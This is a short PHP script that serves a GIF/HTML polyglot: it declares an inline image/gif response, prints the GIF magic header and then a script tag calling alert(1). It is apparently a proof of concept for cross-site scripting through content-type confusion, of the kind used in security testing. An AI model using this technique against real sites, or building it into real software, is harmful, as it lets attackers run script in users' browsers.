<?php
header('Content-Type: image/gif');
header('Content-Disposition: inline'); // Remove attachment
echo "GIF89a";
echo '<script>alert(1)</script>';
?>
